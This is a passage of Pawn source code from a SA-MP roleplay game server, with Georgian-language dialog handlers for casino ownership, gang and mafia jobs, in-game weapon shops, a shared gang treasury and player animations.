		            format(mes,sizeof(mes),"\t{"#cYELLOW"}Kazino\n\n{"#cWHITE"}Mflobeli: {"#cBLUE"}%s\n{"#cWHITE"}Fasi: {"#cGREEN"}%d\n{"#cWHITE"}Banki: {"#cGREEN"}%d",gCasino[0][casinoOwner],gCasino[0][casinoPrice],gCasino[0][casinoBank]);
	    			ShowPlayerDialog(playerid,dMes,DIALOG_STYLE_MSGBOX,"{1B8E06}Kazino",mes,"Migebulia","");
		        }
		        case 2:
		        {
		            if(!gCasino[0][casinoOwner]) return SendClientMessage(playerid,CGRAY,"Aryavs Mplobeli.");
		            if(!GetString(Name2(playerid),gCasino[0][casinoOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Mplobeli Kazinosi.");
					if(gCasino[0][casinoBank] == 0) return SendClientMessage(playerid,CGRAY,"Kazinos Angarishze Araris Sesxebi.");
		            new query[256];
					format(query,sizeof(query),"UPDATE `casino` SET `bank` = '0' WHERE `id` = '%d'",0);
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Yidva Kazinosi)");
					SendClientMessage(playerid,CGREEN,"Kazinos Pulis Raodenoba chamotvlilia Bankshi.");
					pData[playerid][pBank] += gCasino[0][casinoBank];
					UpdatePlayerData(playerid,"bank",pData[playerid][pBank]);
					gCasino[0][casinoBank] = 0;
		        }
		        case 3:
		        {
		            if(!gCasino[0][casinoOwner]) return SendClientMessage(playerid,CGRAY,"Aryavs Mplobeli.");
		            if(!GetString(Name2(playerid),gCasino[0][casinoOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Mplobeli Kazinosi.");
		            new query[256];
					format(query,sizeof(query),"UPDATE `casino` SET `owner` = '' WHERE `id` = '%d'",0);
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Yidva Kazinosi)");
					SendClientMessage(playerid,CGREEN,"Kazinos Pulis Raodenoba chamotvlilia Bankshi.");
					pData[playerid][pBank] += gCasino[0][casinoPrice];
					UpdatePlayerData(playerid,"bank",pData[playerid][pBank]);
					SetString(gCasino[0][casinoOwner],"");
		        }
			}
  		}
		case dGangJob:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(GetPVarInt(playerid,"gangjob") != 0) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Davaleba.");
                    SetPlayerCheckpoint(playerid,1149.5842,-1354.2788,13.6992,5.0);
					SendClientMessage(playerid,CGREEN,"Adgili Rukaze Agnishnulia Witeli Nishnulit.");
					SetPVarInt(playerid,"gangjob",2);
		        }
		        case 1:
		        {
		            if(GetPVarInt(playerid,"gangjob") == 0) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Davaleba.");
		            if(GetPVarInt(playerid,"gangjob") == 1)
					{
					    new gangid = pData[playerid][pFraction] - 3;
						if(!PlayerToPoint(60.0,playerid,1303.8409,-811.6581,1624.9728)) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Mat Monacemta Bazashi.");
						gGangDorm[gangid][2] += 10;
						new query[180];
						format(query,sizeof(query),"UPDATE `gangs` SET `aptek` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][2],gangid+1);
						mysql_empty(mysql, query);
				    	SendClientMessage(playerid,CGREEN,"Tqven Ar Dagimsaxurebiat 500$");
				    	TransferMoney(-1,playerid,500);
				    	SetPVarInt(playerid,"gangjob",0);
				    	WHDataUpdate();
					}
		        }
		        case 2:
		        {
		            if(GetPVarInt(playerid,"gangjob") == 0) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Davaleba.");
                    SetPVarInt(playerid,"gangjob",0);
				    RemovePlayerAttachedObject(playerid,0);
				    DisablePlayerCheckpoint(playerid);
				    SendClientMessage(playerid,CGRAY,"Tqven Ver Daasrulet Davaleba.");
				}
		    }
		}
		case dMafiaJob:
		{
		    if(!response) return true;
		    switch(listitem)
			{
			    case 0:
				{
				    if(GetPVarInt(playerid,"mafiajob") != 0) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt DAvaleba.");
				    new idf = RandomEx(0,6);
					SetPlayerCheckpoint(playerid,gMafiaCP2[idf][0],gMafiaCP2[idf][1],gMafiaCP2[idf][2],5.0);
					SendClientMessage(playerid,CGREEN,"Adgilia Agnishnulia rukaze Witeli Nishnulit.");
					SetPVarInt(playerid,"mafiajob",4);
				}
				case 1:
				{
					if(GetPVarInt(playerid,"mafiajob") != 0) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt DAvaleba.");
				    new idf = RandomEx(0,6);
					SetPlayerCheckpoint(playerid,gMafiaCP[idf][0],gMafiaCP[idf][1],gMafiaCP[idf][2],5.0);
					SendClientMessage(playerid,CGREEN,"Adgilia Agnishnulia rukaze Witeli Nishnulit.");
					SetPVarInt(playerid,"mafiajob",3);
				}
				case 2:
				{
				    if(GetPVarInt(playerid,"mafiajob") == 0) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Davaleba.");
                    if(PlayerToPoint(150.0,playerid,2530.1331,-1304.5524,1048.2891))
                    {
                        if(GetPVarInt(playerid,"mafiajob") != 7) return SendClientMessage(playerid,CGRAY,"Tqven Ver Sheasrulet Davaleba.");
						RemovePlayerAttachedObject(playerid,0);
					    DisablePlayerCheckpoint(playerid);
					    SendClientMessage(playerid,CGREEN,"Tqven Ar DAgimsaxurebiat 1000$");
				    	TransferMoney(-1,playerid,1000);
					    SetPVarInt(playerid,"mafiajob",0);
				    }
				    else SendClientMessage(playerid,CGRAY,"Tqven Arxart Mat Monacemta Bazashi.");
				}
				case 3:
				{
				    if(GetPVarInt(playerid,"mafiajob") == 0) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Davaleba.");
				    SetPVarInt(playerid,"mafiajob",0);
				    RemovePlayerAttachedObject(playerid,0);
				    DisablePlayerCheckpoint(playerid);
				    SendClientMessage(playerid,CGRAY,"Tqven Ver Daasrulet Davaleba.");
				}
			}
		}
		case dBuygun:
	 	{
	 	    if(!response) return true;
	  	    if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 2700) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 23, 150);
			TransferMoney(playerid,-1,2700);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun1:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 3200) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 24, 90);
			TransferMoney(playerid,-1,3200);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun3:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 3500) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 29, 150);
			TransferMoney(playerid,-1,3500);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun4:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 2000) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 25, 60);
			TransferMoney(playerid,-1,2000);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun5:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 100) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 5, 1);
			TransferMoney(playerid,-1,100);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun6:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 6000) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 34, 40);
			TransferMoney(playerid,-1,6000);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun7:
	 	{
	 	    if(!response) return true;
       		if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 4200) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 31, 200);
			TransferMoney(playerid,-1,4200);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
	 	case dBuygun8:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 4200) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    GivePlayerWeaponEx(playerid, 30, 200);
			TransferMoney(playerid,-1,4200);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
		}
	 	case dBuygun9:
	 	{
	 	    if(!response) return true;
 	        if(!(pData[playerid][pLicenses][LIC_WEAP])) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Iaragis Licenzia!");
	 	    if(GetPlayerMoneyEx(playerid) < 1000) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sakmarisi Fuli.");
	 	    SetPlayerArmourEx(playerid, 100);
			TransferMoney(playerid,-1,1000);
			PlayerPlaySound(playerid, 1053, 0, 0, 0);
	 	}
		case dPodval:
		{
		    if(!response) return true;
	 	    switch(listitem)
	 	    {
	 	        case 0: ShowMakeGunList(playerid);
	 	        case 1:
	 	        {
					format(mes,sizeof(mes),"{ffffff}Tqven Gchirdebat Xelnaketi Bombistvis:\n\n1. 500 Metali\n\n{"#cYELLOW"}Bombis Damzadeba Ver Moxerxda!");
	 	            ShowPlayerDialog(playerid,dPodval2,DIALOG_STYLE_MSGBOX,"{FFFFFF}Informacia", mes, "YES","NO");
	    		}
	 	    }
		}
		case dPodval2:
	 	{
	 	    if(!response) return true;
	 	    if(pData[playerid][pGunAmount] < 500) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt 500 Metali.");
	 	    SendClientMessage(playerid,CWHITE,"Naxet Karada Rom Aigot Instrumentebi.");
	 	    SetPVarInt(playerid,"podvala",2);
		}
		case dRabot:
	 	{
	   	  	if(!response) return true;
	   	  	if(GetPVarInt(playerid,"pOff7") != 1) return SendClientMessage(playerid,CRED,"Anti-DIALOG HIDER. (by Ivan_Budko)");
   			switch(listitem)
	 	    {
	 	        case 0: pData[playerid][pStamina] += 10, GameTextForPlayer(playerid, "~g~Stamina ~y~ADD", 10000, 3);
				case 1: pData[playerid][pPower] += 10, GameTextForPlayer(playerid, "~g~Power ~y~ADD", 10000, 3);
	 		}
	 		if(pData[playerid][pPower] >= 500) pData[playerid][pPower] = 500;
	 		if(pData[playerid][pStamina] >= 500) pData[playerid][pStamina] = 500;
	 		SetPVarInt(playerid,"pOff7",0);
	 		ClearAnimations(playerid,1);
			return true;
		}
		case dBizLis:
		{
		    if(!response) return true;
			new strrr1[2400],mafiatext[40];
			for(new id = 0; id < MAX_BUSINESS_COUNT; id++)
	  		{
	            switch(gBusiness[id][busiMafia])
				{
	    			case F_COL: mafiatext = "RM";
			 		case F_MEX: mafiatext = "LCN";
	    			case F_YAK: mafiatext = "Yakuza";
				}
	   			if(id < 30) format(strrr1, sizeof(strrr1), "");
				if(id > 30) format(strrr1, 2400, "%s%d. %s, [%s]\n",strrr1,id,gBusiness[id][busiName],mafiatext);
	  		}
	  		ShowPlayerDialog(playerid, dMes, 0, "Biznesi", strrr1, "NEXT", "CLOSE");
		}
		case dBizWar:
		{
		    if(!response) return MafiaNapad = 0, MafiaID = 0,SendClientMessage(playerid, CGREEN, "Dapyroba Gauqmebulia");
		    SendClientMessage(playerid, CGREEN, "Airchiet Rukaze Adgili Romelic Umaspindzlebs Shexvedras");
			SetPVarInt(playerid,"BizWar",1);
		}
		case dSetSpawn:
		{
		    if(!response) return true;
		    new zS[156];
		    switch(listitem)
		    {
		        case 0:
				{
				    if(!pData[playerid][pHouse]) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Saxli.");
					format(zS, sizeof(zS), "Tqven Axla Xart Rogorc Chans Saxlshi.");
				}
		        case 1: format(zS, sizeof(zS), "Tqven Imyopebit Rogorc Chans Organizaciis Bazaze / Rkinigzis Sadgurze.");
				case 2:
				{
				    if(!pData[playerid][pOtel]) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Sastumros Otaxi.");
					format(zS, sizeof(zS), "Tqven Axla Xart Rogorc Chans Sastumros Otaxshi.");
				}
		    }
			pData[playerid][pSpawn] = listitem+1;
			SendClientMessage(playerid,CGRAY,zS);
			UpdatePlayerData(playerid, "spawn", listitem+1);
		}
		case dObshak:
	    {
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dObshakEd,2,"Shecdoma","Ganatavset Metali\nMonihsnet Metali","Shemdegi","Dabruneba");
				case 1: ShowPlayerDialog(playerid,dObshakPt,2,"Shecdoma","Ganatavset Tyviebi\nMonishnet Katrijebi","Shemdegi","Dabruneba");
				case 2: ShowPlayerDialog(playerid,dObshakMn,2,"Shecdoma","Ganatavset Tqveni Fuli\nMonishnet Fuli","Shemdegi","Dabruneba");
			}
	    }
	    case dObshakEd:
	    {
	        if(!response) return OnPlayerCommandText(playerid,"/gob");
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dObshakEdput,1,"Ganatavset Rkina","Shesvlis Faci","Shedegi","Dabruneba");
				case 1: ShowPlayerDialog(playerid,dObshakEdtake,1,"Monishne Rkina","Shecvlis raodenoba","Shemdegi","Dabruneba");
			}
	    }
	    case dObshakPt:
	    {
	        if(!response) return OnPlayerCommandText(playerid,"/gob");
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dObshakPtput,1,"Ganatavset Tyviebi","Shecvlis raodenoba","Shedegi","Dabruneba");
				case 1: ShowPlayerDialog(playerid,dObshakPttake,1,"Monishne Tyviebi","Shecvlis raodenoba","Shemdegi","Dabruneba");
			}
	    }
	    case dObshakMn:
	    {
	        if(!response) return OnPlayerCommandText(playerid,"/gob");
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dObshakMnput,1,"Ganatavse Fuli","Shecvlis raodenoba","Shemdegi","Dabruneba");
				case 1: ShowPlayerDialog(playerid,dObshakMntake,1,"Monihsne Fuli","Shecvlis raodenoba","Shemdegi","Dabruneba");
			}
	    }
	    case dObshakMnput:
		{
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			new gangid = pData[playerid][pFraction] - 3;
			if(!IsPlayerInDynamicArea(playerid,gAreas[arDorm]) && GetPlayerVirtualWorld(playerid) != gangid) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Saerto Fulis Otaxshi");
			new amount = strval(inputtext);
			if(!strlen(inputtext) || !isNumeric(inputtext)) return SendClientMessage(playerid,CGRAY,"Tqven Sheiyvanet Araswori Mnihsvneloba");
			if(pData[playerid][pMoney] < amount || amount < 0) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tanxa");
			gGangDorm[gangid][3] += amount;
			WHDataUpdate();
			TransferMoney(playerid,-1,amount);
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(pData[i][pFraction] != pData[playerid][pFraction]) continue;
				format(mes,sizeof(mes),"%s {"#cGREEN"}Saerto Raodenoba {"#cWHITE"}%d {"#cGREEN"}$",Name2(playerid),amount);
				SendClientMessage(i,CWHITE,mes);
			}
			MeAction(playerid,"Fulis Saerto Raodenoba");
			new query[128];
			format(query,sizeof(query),"UPDATE `gangs` SET `money` = '%d', `ammo` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][3],gGangDorm[gangid][1],gangid+1);
			mysql_empty(mysql, query);
		}
		case dObshakMntake:
		{
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			new gangid = pData[playerid][pFraction] - 3;
			if(!IsPlayerInDynamicArea(playerid,gAreas[arDorm]) && GetPlayerVirtualWorld(playerid) != gangid) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Saerto Fulis Otaxshi");
			new amount = strval(inputtext);
			if(!strlen(inputtext) || !isNumeric(inputtext)) return SendClientMessage(playerid,CGRAY,"Tqven Sheiyvanet Araswori Mnihsvneloba");
			if(gGangDorm[gangid][3] < amount || amount < 0) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tanxa");
			gGangDorm[gangid][3] -= amount;
			WHDataUpdate();
			TransferMoney(-1,playerid,amount);
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(pData[i][pFraction] != pData[playerid][pFraction]) continue;
				format(mes,sizeof(mes),"%s {"#cGREEN"}Saerto Raodenoba {"#cWHITE"}%d {"#cGREEN"}$",Name2(playerid),amount);
				SendClientMessage(i,CWHITE,mes);
			}
			MeAction(playerid,"Fulis Saerto Raodenoba");
			new query[128];
			format(query,sizeof(query),"UPDATE `gangs` SET `money` = '%d', `ammo` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][3],gGangDorm[gangid][1],gangid+1);
			mysql_empty(mysql, query);
		}
	    case dObshakPtput:
		{
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			new gangid = pData[playerid][pFraction] - 3;
			if(!IsPlayerInDynamicArea(playerid,gAreas[arDorm]) && GetPlayerVirtualWorld(playerid) != gangid) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Saerto Fulis Otaxshi");
			if(!strlen(inputtext) || !isNumeric(inputtext)) return SendClientMessage(playerid,CGRAY,"Tqven Sheiyvanet Araswori Mnihsvneloba");
			new gunamount = strval(inputtext);
			if(pData[playerid][pAmmo] < gunamount) return SendClientMessage(playerid,CGRAY,"Tqven Gaqvt Arasakmarisi Tyviebi.");
			gGangDorm[gangid][1] += gunamount;
			pData[playerid][pAmmo] -= gunamount;
			Pokaz(playerid,2,gunamount,0);
			WHDataUpdate();
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(pData[i][pFraction] != pData[playerid][pFraction]) continue;
				format(mes,sizeof(mes),"%s {"#cGREEN"}Saerto Raodenoba {"#cWHITE"}%d {"#cGREEN"}Tyviebi",Name2(playerid),gunamount);
				SendClientMessage(i,CWHITE,mes);
			}
			MeAction(playerid,"Bolo Tyvia Saertoshi");
			new query[180];
			format(query,sizeof(query),"UPDATE `gangs` SET `ammo` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][1],gangid+1);
			mysql_empty(mysql, query);
			format(query,sizeof(query),"UPDATE `members` SET `ammo` = '%d' WHERE `nickname` = '%s'",pData[playerid][pAmmo],Name2(playerid));
			mysql_empty(mysql, query);
		}
	    case dObshakPttake:
		{
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			new gangid = pData[playerid][pFraction] - 3;
			if(!IsPlayerInDynamicArea(playerid,gAreas[arDorm]) && GetPlayerVirtualWorld(playerid) != gangid) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Saerto Fulis Otaxshi");
			if(!strval(inputtext) || !isNumeric(inputtext)) return SendClientMessage(playerid,CGRAY,"/putgun [Erteuli Iaragi] [Tyviebi]");
			new gunamount = strval(inputtext);
			if(gGangDorm[gangid][1] < gunamount  || gunamount < 0) return SendClientMessage(playerid,CGRAY,"Saertoshi Aris Arasakmarisi Tyviebi");
			if(pData[playerid][pAmmo] + gunamount > 2000) return SendClientMessage(playerid,CGRAY,"Tqven Arshegiliat Ganatavsot 2.000 Meti Masala");
			gGangDorm[gangid][1] -= gunamount;
			pData[playerid][pAmmo] += gunamount;
			Pokaz(playerid,2,gunamount,1);
			WHDataUpdate();
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(pData[i][pFraction] != pData[playerid][pFraction]) continue;
				format(mes,sizeof(mes),"%s {"#cGREEN"}Saerto Raodenoba {"#cWHITE"}%d {"#cGREEN"}Tyviebi",Name2(playerid),gunamount);
				SendClientMessage(i,CWHITE,mes);
			}
			MeAction(playerid,"Bolo Tyvia Saertoshi");
			new query[180];
			format(query,sizeof(query),"UPDATE `gangs` SET `ammo` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][1],gangid+1);
			mysql_empty(mysql, query);
			format(query,sizeof(query),"UPDATE `members` SET `ammo` = '%d' WHERE `nickname` = '%s'",pData[playerid][pAmmo],Name2(playerid));
			mysql_empty(mysql, query);
		}
	    case dObshakEdput:
		{
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis.");
			new gangid = pData[playerid][pFraction] - 3;
			if(!IsPlayerInDynamicArea(playerid,gAreas[arDorm]) && GetPlayerVirtualWorld(playerid) != gangid) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Saerto Fulis Otaxshi.");
			if(!strval(inputtext) || !isNumeric(inputtext)) return SendClientMessage(playerid,CGRAY,"/putgun [Erteuli Iaragi] [Tyviebi]");
			new gunamount = strval(inputtext);
			if(pData[playerid][pGunAmount] < gunamount  || gunamount < 0) return SendClientMessage(playerid,CGRAY,"Saertoshi Aris Arasakmarisi Iaragi.");
			gGangDorm[gangid][0] += gunamount;
			pData[playerid][pGunAmount] -= gunamount;
			Pokaz(playerid,3,gunamount,0);
			WHDataUpdate();
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(pData[i][pFraction] != pData[playerid][pFraction]) continue;
				format(mes,sizeof(mes),"%s {"#cGREEN"}Saerto Raodenoba {"#cWHITE"}%d {"#cGREEN"}Rkina",Name2(playerid),gunamount);
				SendClientMessage(i,CWHITE,mes);
			}
			MeAction(playerid,"Bolo Rkina Saertoshi");
			new query[180];
			format(query,sizeof(query),"UPDATE `gangs` SET `gunamount` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][0],gangid+1);
			mysql_empty(mysql, query);
			format(query,sizeof(query),"UPDATE `members` SET `gunamount` = '%d' WHERE `nickname` = '%s'",pData[playerid][pGunAmount],Name2(playerid));
			mysql_empty(mysql, query);
		}
	    case dObshakEdtake:
		{
	        if(!response) return true;
			if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Punqcia Xelmisawvdomia Mxolod Bandebistvis");
			new gangid = pData[playerid][pFraction] - 3;
			if(!IsPlayerInDynamicArea(playerid,gAreas[arDorm]) && GetPlayerVirtualWorld(playerid) != gangid) return SendClientMessage(playerid,CGRAY,"Вы должны быть в комнате с общаком");
			if(!strval(inputtext) || !isNumeric(inputtext)) return SendClientMessage(playerid,CGRAY,"/putgun [Erteuli Iaragi] [Tyviebi]");
			new gunamount = strval(inputtext);
			if(gGangDorm[gangid][0] < gunamount) return SendClientMessage(playerid,CGRAY,"Saertoshi Aris Arasakmarisi Iaragi");
            if(pData[playerid][pGunAmount] + gunamount > 50000) return SendClientMessage(playerid,CGRAY,"Tqven Arshegiliat Moatavsot 50000-Ze Meti Rkina");
			gGangDorm[gangid][0] -= gunamount;
			pData[playerid][pGunAmount] += gunamount;
			Pokaz(playerid,3,gunamount,1);
			WHDataUpdate();
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(pData[i][pFraction] != pData[playerid][pFraction]) continue;
				format(mes,sizeof(mes),"%s {"#cGREEN"}Saerto Raodenoba {"#cWHITE"}%d {"#cGREEN"}Rkina",Name2(playerid),gunamount);
				SendClientMessage(i,CWHITE,mes);
			}
			MeAction(playerid,"взял металл из общака");
			new query[180];
			format(query,sizeof(query),"UPDATE `gangs` SET `gunamount` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][0],gangid+1);
			mysql_empty(mysql, query);
			format(query,sizeof(query),"UPDATE `members` SET `gunamount` = '%d' WHERE `nickname` = '%s'",pData[playerid][pGunAmount],Name2(playerid));
			mysql_empty(mysql, query);
		}
		case dAnimliber:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE1);
		        case 1: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE2);
		        case 2: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE3);
		        case 3: SetPlayerSpecialAction (playerid, SPECIAL_ACTION_DANCE4);
		        case 4: GoAnim(playerid,"DEALER","Dealer_idle",4.1,1,0,0,0,0,0);
		        case 5: ApplyAnimation(playerid,"DEALER","Dealer_Deal",4.1,0,0,0,0,0,1);
		        case 6: ApplyAnimation(playerid,"FOOD","Eat_Burger",4.1,0,0,0,0,0,1);
				case 7: ApplyAnimation(playerid,"PAULNMAC","Piss_in",4.1,0,0,0,0,0,1);
				case 8: GoAnim(playerid,"PARK","Tai_Chi_Loop",4.1,1,0,0,0,0,0);
				case 9: GoAnim(playerid,"CRACK","Crckidle1",4.1,1,0,0,0,0,0);
				case 10: GoAnim(playerid,"CRACK","Crckidle2",4.1,1,0,0,0,0,0);
				case 11: GoAnim(playerid,"CRACK","Crckidle4",4.1,1,0,0,0,0,0);
				case 12: ApplyAnimation(playerid,"SWEET","sweet_ass_slap",4.1,0,0,0,0,0,1);
				case 13: GoAnim(playerid,"SPRAYCAN","spraycan_full",4.1,1,0,0,0,0,0);
				case 14: GoAnim(playerid,"GRAFFITI","spraycan_fire",4.1,1,0,0,0,0,0);
				case 15: GoAnim(playerid,"SMOKING","M_smkstnd_loop",4.1,1,0,0,0,0,0);
				case 16: GoAnim(playerid,"SHOP","ROB_Loop_Threat",4.1,1,0,0,0,0,0);
				case 17: ApplyAnimation(playerid,"SHOP","ROB_shifty",4.1,0,0,0,0,0,1);
				case 18: GoAnim(playerid,"SHOP","SHP_Rob_HandsUP",4.1,1,0,0,0,0,0);
				case 19: GoAnim(playerid,"RYDER","Ryd_Beckon_02",4.1,1,0,0,0,0,0);
				case 20: ApplyAnimation(playerid,"RIOT","Riot_Angry",4.1,0,0,0,0,0,0);
				case 21: GoAnim(playerid,"RIOT","Riot_Angry_B",4.1,1,0,0,0,0,0);
				case 22: GoAnim(playerid,"RIOT","Riot_Chant",4.1,1,1,0,0,0,0);
				case 23: GoAnim(playerid,"RIOT","Riot_Punches",4.1,1,0,0,0,0,0);
				case 24: ApplyAnimation(playerid,"PED","fucku",4.1,0,0,0,0,0,1);
		        case 25: ApplyAnimation(playerid,"BAR","dnK_StndM_loop",4.1,0,0,0,0,0,1);
		        case 26: GoAnim(playerid,"BD_FIRE","BD_Panic_03",4.1,1,0,0,0,0,0);
		        case 27: GoAnim(playerid,"BD_FIRE","M_smklean_loop",4.1,1,0,0,0,0,0);
				case 28: GoAnim(playerid,"BEACH","bather",4.1,1,0,0,0,0,0);
				case 29: GoAnim(playerid,"BEACH","Lay_Bac_loop",4.1,1,0,0,0,0,0);
				case 30: GoAnim(playerid,"BEACH","Parksit_w_loop",4.1,1,0,0,0,0,0);
				case 31: GoAnim(playerid,"BEACH","Sitnwait_Loop_W",4.1,1,0,0,0,0,0);
				case 32: GoAnim(playerid,"BEACH","Parksit_M_loop",4.1,1,0,0,0,0,0);
